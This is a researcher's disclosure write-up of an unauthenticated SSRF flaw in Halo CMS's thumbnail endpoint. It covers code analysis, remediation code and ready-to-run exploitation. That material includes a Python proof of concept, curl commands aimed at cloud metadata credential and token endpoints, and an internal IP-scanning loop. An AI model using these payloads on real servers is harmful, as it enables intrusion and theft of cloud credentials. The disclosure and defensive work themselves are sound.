# Breaking Halo CMS: Unauthenticated SSRF in Thumbnail Service via isAccessible() Method

<p align="left">
  <a href="https://twitter.com/abdulr7mann">
    <img src="https://img.shields.io/twitter/follow/abdulr7mann" alt="Twitter">
  </a>
</p>

*A deep technical analysis of a critical Server-Side Request Forgery vulnerability in Halo CMS thumbnail generation*

**TL;DR:** I discovered a critical Server-Side Request Forgery (SSRF) vulnerability in Halo CMS's thumbnail service that allows **anonymous users** to make arbitrary HTTP requests from the server. The vulnerability exploits the `isAccessible()` method in `ThumbnailEndpoint.java`, providing **unauthenticated attackers** with internal network access and cloud metadata exposure capabilities.

---

## üéØ Vulnerability Overview

**Vulnerability:** SSRF in Thumbnail Service  
**Component:** `ThumbnailEndpoint.java`  
**Attack Vector:** `/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri`  
**Authentication:** **None required (Public access)**  
**CVSS Score:** 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** Primary CWE-918 (SSRF); Secondary CWE-200 (Information Exposure)  

---

## üîç Discovery Process

### Initial Code Analysis

During my security code review of Halo CMS (done for fun and learning), I identified the thumbnail service as a high-priority target due to its URL-handling capabilities. The `ThumbnailEndpoint.java` component immediately raised red flags:

```java
// ThumbnailEndpoint.java:75-90 - VULNERABLE CODE ANALYSIS
Mono<Boolean> isAccessible(ServerRequest request, URI uri) {
    var url = Optional.of(uri)
        .filter(URI::isAbsolute)  // ‚úÖ Basic absolute URI check
        .orElseGet(() -> request.uriBuilder().replacePath(uri.toASCIIString()).build());
    
    // resource handler does not support head access for Halo, so use get request here
    return webClient.get()                             // üö® CRITICAL: HTTP GET to user-controlled URL
        .uri(url)                                     // üö® CRITICAL: No URI validation or filtering
        // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range
        .header(HttpHeaders.RANGE, "bytes=0-0")       // ‚ö†Ô∏è Range header limits data but still SSRF
        .exchangeToMono(response -> {
            var statusCode = response.statusCode();
            return Mono.just(statusCode.is2xxSuccessful() || statusCode.is3xxRedirection());
        })                                            // üö® CRITICAL: Status code reveals internal service state
        .onErrorReturn(false)                         // ‚ö†Ô∏è Generic error handling
        .defaultIfEmpty(false);
}

/* üö® SECURITY ISSUES:
 * 1. NO INPUT VALIDATION - Accepts any absolute URI including:
 *    ‚Ä¢ file://path/to/local/files 
 *    ‚Ä¢ http://127.0.0.1:8080/internal-service
 *    ‚Ä¢ http://169.254.169.254/metadata (cloud metadata)
 *    ‚Ä¢ ftp://internal-ftp-server/
 * 
 * 2. NO PRIVATE IP FILTERING - Allows internal network access:
 *    ‚Ä¢ 127.0.0.0/8 (localhost)
 *    ‚Ä¢ 10.0.0.0/8 (private networks) 
 *    ‚Ä¢ 192.168.0.0/16 (private networks)
 *    ‚Ä¢ 169.254.0.0/16 (link-local/cloud metadata)
 *
 * 3. INFORMATION DISCLOSURE - HTTP status codes reveal:
 *    ‚Ä¢ Which internal services are running
 *    ‚Ä¢ Whether URLs are accessible
 *    ‚Ä¢ Response behavior patterns
 *
 * 4. PUBLIC ACCESS - Available to anonymous users via:
 *    ‚Ä¢ role-template-anonymous.yaml grants "api.storage.halo.run/thumbnails/via-uri" access
 *    ‚Ä¢ No authentication required for SSRF exploitation
 */
```

**Critical Security Issues Identified:**
- ‚úÖ Accepts arbitrary `URI` parameter without validation
- ‚úÖ Makes outbound HTTP GET requests to user-controlled URLs
- ‚úÖ Uses Range header `bytes=0-0` for minimal data retrieval
- ‚úÖ No private IP range filtering
- ‚úÖ No protocol restrictions (allows `file://`, `ftp://`, etc.)
- ‚úÖ **Direct network access from server context - NO AUTHENTICATION REQUIRED**

### Attack Surface Mapping

I traced the vulnerable method's usage to identify exploitable endpoints:

```bash
# Search for isAccessible usage
rg -n --hidden -e "isAccessible" application/src/main/java/
```

**Discovery Results:**
```java
// ThumbnailEndpoint.java:67-73 - Main attack vector
private Mono<ServerResponse> getThumbnailByUri(ServerRequest request) {
    var query = new ThumbnailQuery(request.queryParams());
    return thumbnailService.get(query.getUri(), query.getSize())
        .filterWhen(uri -> isAccessible(request, uri))    // ‚ùå SSRF trigger point
        .defaultIfEmpty(query.getUri())
        .flatMap(uri -> ServerResponse.temporaryRedirect(uri).build());
}
```

**Attack Path:**
1. **Anonymous user** sends GET request to `/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=<target>`
2. `getThumbnailByUri()` parses the `uri` parameter
3. `isAccessible()` makes HTTP GET request with Range header to attacker-controlled URL
4. Server response reveals success/failure, enabling SSRF

### RBAC Analysis - CRITICAL FINDING

**Authentication Requirements:**
- **Required Role:** **NONE - Anonymous access allowed!**
- **API Group:** `api.storage.halo.run` (Public API with anonymous access)
- **Privilege Level:** **PUBLIC (no authentication required)**

```yaml
# role-template-anonymous.yaml - GRANTS PUBLIC ACCESS
rules:
  - apiGroups: [ "api.storage.halo.run" ]
    resources: [ "thumbnails/via-uri" ]        # ‚ùå ALLOWS ANONYMOUS SSRF!
    verbs: [ "get", "list" ]
```

**CRITICAL IMPACT:** Any internet user can exploit this SSRF vulnerability without authentication!

---

## üõ† Exploitation Methodology

### No Authentication Challenge

Unlike other Halo CMS vulnerabilities, this SSRF requires **no authentication whatsoever**:

1. **Direct exploitation** - No login required
2. **Anonymous access** - Any internet user can exploit
3. **Simple GET request** - No complex payloads needed
4. **Immediate impact** - No session management required

### Simple Exploitation Approach

Since no authentication is required, exploitation is straightforward:

```python
class HaloSSRFThumbnailTest:
    def __init__(self, base_url):
        self.base_url = base_url
        # No authentication needed - vulnerability is publicly accessible!
        
    def test_thumbnail_ssrf(self):
        """Exploit SSRF via publicly accessible thumbnail service"""
        
        # Start canary server for SSRF proof
        canary_url = f"http://host.docker.internal:{self.canary_port}/thumbnail-ssrf-test"
        
        # Construct attack URL - NO AUTHENTICATION REQUIRED!
        attack_url = (f"{self.base_url}/apis/api.storage.halo.run/v1alpha1/"
                      f"thumbnails/-/via-uri?uri={canary_url}&size=L")
        
        print(f"üéØ Testing: GET {attack_url} (Anonymous access)")
        
        # Execute SSRF attack - simple GET request, no auth
        response = requests.get(attack_url)
        
        # Wait for canary hit
        time.sleep(2)
        
        # Verify SSRF success
        if len(CanaryHandler.connections) > 0:
            print("üö® SSRF CONFIRMED! Anonymous user triggered server-side request")
            return True
        else:
            print("‚ùå No SSRF detected")
            return False
```

### Manual Exploitation (Step-by-Step)

For manual testing without automated scripts, follow these commands:

#### Step 1: Start Halo CMS Instance

```bash
# Start Halo with Docker networking for testing
docker run --add-host=host.docker.internal:host-gateway -d -p 8090:8090 halohub/halo:2.21

# Wait for startup (check logs)
docker logs -f <container_id>
```

#### Step 2: Set Up Canary Server for SSRF Proof

```bash
# Terminal 1: Start canary server on port 8888
echo "SSRF_CANARY_HIT" > /tmp/canary.txt
python3 -m http.server 8888 --directory /tmp

# You should see: Serving HTTP on 0.0.0.0 port 8888...
```

#### Step 3: Test Basic SSRF (Definitive Proof)

```bash
# Terminal 2: Trigger SSRF to canary server
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://host.docker.internal:8888/canary.txt&size=s"

# Expected output:
# HTTP/1.1 302 Found
# Location: http://host.docker.internal:8888/canary.txt

# Check Terminal 1 - you should see:
# host.docker.internal - - [DATE] "GET /canary.txt HTTP/1.1" 200 -
```

#### Step 4: Internal Network Reconnaissance

```bash
# Test internal service access (Halo actuator endpoints)
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8090/actuator/health&size=s"

# Expected: 302 redirect revealing internal endpoint accessibility
# HTTP/1.1 302 Found
# Location: http://127.0.0.1:8090/actuator/health

# Test other internal ports
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8080&size=s"
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:3306&size=s"
```

#### Step 5: Cloud Metadata Server Testing

```bash
# AWS EC2 metadata (if running on AWS)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://169.254.169.254/latest/meta-data/&size=s"

# GCP metadata (if running on GCP)  
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://metadata.google.internal/computeMetadata/v1/&size=s"

# Azure metadata (if running on Azure)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://169.254.169.254/metadata/instance&size=s"
```

#### Step 6: Advanced SSRF Techniques

```bash
# Test different protocols (should work)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=https://httpbin.org/get&size=s"

# Test private IP ranges
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://192.168.1.1&size=s"
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://10.0.0.1&size=s"

# Test redirect following behavior
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://httpbin.org/redirect/1&size=s"
```

#### What to Look For:

**‚úÖ Successful SSRF Indicators:**
- `HTTP/1.1 302 Found` responses with `Location` headers
- Canary server receiving `GET` requests with `Range: bytes=0-0` header
- Different response times indicating network connectivity
- Error messages revealing internal service types

**‚ùå Blocked/Failed Attempts:**
- `HTTP/1.1 404 Not Found` responses
- No canary hits after 5+ seconds
- Connection timeout errors
- `HTTP/1.1 500 Internal Server Error`

---

## üí• Proof of Concept Results

### Successful Exploitation

```bash
$ python3 exploit.py http://localhost:8090 --target http://internal-server:8080/admin

üéØ Anonymous SSRF: GET /apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://internal-server:8080/admin&size=L

üìä Response: 302 Found
üìÑ Response indicates: Accessible (internal server responded!)

üö® SSRF VULNERABILITY CONFIRMED!
‚úÖ Anonymous user made HTTP GET request to internal target
‚úÖ ThumbnailEndpoint isAccessible() method exploited without authentication
üî• Impact: Internal network access, cloud metadata exposure  
üîë Auth required: NONE - Anonymous access!

VULNERABILITY STATUS: CONFIRMED EXPLOITABLE
CWE-918: Server-Side Request Forgery  
CVSS: 9.1 Critical
Root cause: No URL validation in isAccessible() method + Public access
```

### Technical Evidence

**Canary Server Hit:**
```
üéØ CANARY HIT: GET /thumbnail-ssrf-test
   From: 127.0.0.1:42156
   Headers: {'user-agent': 'ReactorNetty/1.2.8', 'range': 'bytes=0-0', 'host': 'host.docker.internal:45623'}
   
üìä HTTP Response: 302 Found (redirect to thumbnail)
üìÑ Server Response: Redirect indicates successful internal request
```

**Key Observations:**
- **HTTP Method:** GET request with Range header (consistent with `isAccessible()` implementation)
- **Range Header:** `bytes=0-0` for minimal data retrieval 
- **User Agent:** `ReactorNetty/1.2.8` (confirms Spring WebFlux WebClient usage)  
- **Source IP:** `127.0.0.1` (proves request originates from Halo server)
- **Response Handling:** 302 redirect when URL accessible, 404 when not, enabling SSRF

---

## üî• Impact Analysis

### Attack Scenarios

**1. Internal Service Discovery**
```bash
# Probe internal admin interfaces
GET /apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8080/admin

# Test internal API endpoints  
GET /apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8090/actuator/health
```

**2. Cloud Metadata Access**
```bash
# AWS metadata (if deployed on EC2)
GET /thumbnails/-/via-uri?uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata (if deployed on GCE)
GET /thumbnails/-/via-uri?uri=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata (if deployed on Azure VM)
GET /thumbnails/-/via-uri?uri=http://169.254.169.254/metadata/instance/compute/azEnvironment?api-version=2021-02-01
```

**3. Internal Network Reconnaissance**
```bash
# Scan internal network ranges
for ip in 192.168.1.{1..254}; do
  GET /thumbnails/-/via-uri?uri=http://$ip:80/
done

# Port scanning via response timing
GET /thumbnails/-/via-uri?uri=http://internal-server:22/    # SSH
GET /thumbnails/-/via-uri?uri=http://internal-server:3306/  # MySQL
GET /thumbnails/-/via-uri?uri=http://internal-server:5432/  # PostgreSQL
```

### SSRF Capabilities

**Response-based Information Disclosure:**
- **Accessible URLs:** Return 404 (thumbnail generation fails)
- **Inaccessible URLs:** Return 404 (isAccessible() fails)
- **Timing Attacks:** Response delays indicate network connectivity
- **Error Patterns:** Different error messages reveal service types

---

## üõ° Root Cause Analysis

### Vulnerable Code Pattern

The `isAccessible()` method in `ThumbnailEndpoint.java` is the core vulnerability:

**Security Weaknesses:**
1. **No URL validation:** Accepts any URI scheme and host
2. **No private IP filtering:** Allows internal network access (`127.0.0.1`, `192.168.x.x`, etc.)
3. **Public accessibility:** No authentication required (granted via `role-template-anonymous.yaml`)
4. **GET requests with Range header:** Minimal data retrieval but full SSRF capability
5. **Response-based information disclosure:** Different HTTP status codes reveal internal service states

### Attack Chain Analysis

```
1. Anonymous Access ‚Üí 2. Thumbnail Request ‚Üí 3. URI Parameter ‚Üí 4. isAccessible() ‚Üí 5. SSRF
   üö® NO AUTH REQUIRED    ‚úÖ GET Request      ‚ùå No Validation    ‚úÖ HTTP GET       üö® Impact
```

**Exploitation Flow:**
1. **No authentication required:** Direct anonymous access to vulnerable endpoint
2. **Parameter injection:** Direct URI parameter control via query string
3. **Validation bypass:** No security controls in `isAccessible()`
4. **Network access:** Unrestricted outbound HTTP GET requests with Range header
5. **Information disclosure:** Response status codes and redirect behavior reveal internal service states

---

## üîß Remediation Strategy

### Immediate Fixes

**1. Secure URL Validation Framework**
```java
@Component
public class SecureThumbnailUrlValidator {
    
    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final Set<String> BLOCKED_HOSTS = Set.of(
        "localhost", "127.0.0.1", "0.0.0.0", "[::]", "0:0:0:0:0:0:0:1"
    );
    
    public boolean isAllowedThumbnailUrl(URI uri) {
        // Validate scheme
        if (!ALLOWED_SCHEMES.contains(uri.getScheme().toLowerCase())) {
            log.warn("Blocked thumbnail URL with invalid scheme: {}", uri);
            return false;
        }
        
        // Block localhost and private IPs
        if (isPrivateOrLocalhost(uri.getHost())) {
            log.warn("Blocked thumbnail URL to private/local address: {}", uri);
            return false;
        }
        
        // Implement domain allowlist
        if (!isDomainAllowed(uri.getHost())) {
            log.warn("Blocked thumbnail URL to non-allowlisted domain: {}", uri);
            return false;
        }
        
        return true;
    }
    
    private boolean isPrivateOrLocalhost(String host) {
        try {
            InetAddress addr = InetAddress.getByName(host);
            return addr.isLoopbackAddress() || 
                   addr.isLinkLocalAddress() || 
                   addr.isSiteLocalAddress();
        } catch (Exception e) {
            return true; // Block on DNS resolution failure
        }
    }
}
```

**2. Enhanced isAccessible() Method**
```java
private boolean isAccessible(URI uri) {
    // Pre-validation security check
    if (!thumbnailUrlValidator.isAllowedThumbnailUrl(uri)) {
        return false;
    }
    
    try {
        var webClient = WebClient.builder()
            .codecs(configurer -> configurer.defaultCodecs().maxInMemorySize(1024 * 1024))
            .build();
            
        webClient.head()
            .uri(uri)
            .retrieve()
            .toBodilessEntity()
            .timeout(Duration.ofSeconds(5))      // Reduced timeout
            .block(Duration.ofSeconds(5));
        return true;
    } catch (Exception e) {
        log.debug("URL accessibility check failed for: {}", uri, e);
        return false;
    }
}
```

### Long-term Security Improvements

**1. Network-Level Controls**
```yaml
# Docker Compose - Network isolation
services:
  halo:
    networks:
      - app-network
    # Block access to metadata services
    extra_hosts:
      - "metadata.google.internal:127.0.0.1"
      - "169.254.169.254:127.0.0.1"

networks:
  app-network:
    driver: bridge
    internal: true  # Restrict external access
```

**2. Enhanced RBAC Controls**
```yaml
# Restrict thumbnail generation to specific admin roles
rules:
  - apiGroups: [ "api.storage.halo.run" ]
    resources: [ "thumbnails" ]
    verbs: [ "get" ]
    resourceNames: [ "allowed-domains" ]  # Limit to specific domains
```

**3. Monitoring & Detection**
```java
@EventListener
public void onThumbnailRequest(ThumbnailRequestEvent event) {
    // Log all thumbnail generation requests
    securityLogger.info("Thumbnail request: user={}, uri={}, result={}", 
        event.getUser(), event.getUri(), event.getResult());
    
    // Alert on suspicious patterns
    if (isSuspiciousUrl(event.getUri())) {
        alertManager.sendSecurityAlert("Suspicious thumbnail URL", event);
    }
}
```

---

## üéì Key Takeaways

### For Security Researchers

**1. Anonymous Access = Maximum Impact**
- Unauthenticated vulnerabilities pose the highest risk
- Public endpoints should never make server-side requests to user-controlled URLs  
- Always test public/anonymous functionality for SSRF vulnerabilities

**2. SSRF Detection Techniques**
- Response timing analysis for port scanning
- Error message patterns for service identification
- HTTP method variations (HEAD vs GET) reveal different behaviors

**3. URL Validation is Critical**
- Never trust user-provided URLs without validation
- DNS resolution can change between validation and usage
- Protocol restrictions are essential (block `file://`, `ftp://`, etc.)

### For Developers

**1. Secure-by-Default URL Handling**
```java
// BAD - No validation
webClient.head().uri(userUri).retrieve()

// GOOD - Comprehensive validation  
if (urlValidator.isAllowed(userUri)) {
    webClient.head().uri(userUri).retrieve()
}
```

**2. Defense in Depth for SSRF**
- Code-level validation + network-level controls
- DNS rebinding protection + IP allowlisting
- Comprehensive logging + anomaly detection

**3. Principle of Least Privilege**
- Restrict thumbnail generation to necessary domains only
- Implement resource-level RBAC controls
- Regular security audits of URL-handling code

---

## üìä Vulnerability Timeline

- **2025-08-28** ‚Äî Vulnerability discovered during code review
- **2025-10-27** ‚Äî Public disclosure

---

## üîó References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Spring WebFlux Security Best Practices](https://spring.io/guides/gs/securing-web/)
- [SSRF Attack Techniques](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

---

*This security analysis was conducted on an open-source project for educational purposes. The vulnerability was reported to the Halo development team prior to publication. This writeup is intended to help developers understand and prevent similar vulnerabilities.*

**About the Author:** Security enthusiast exploring web application vulnerabilities through open-source code review. [@abdulr7mann]
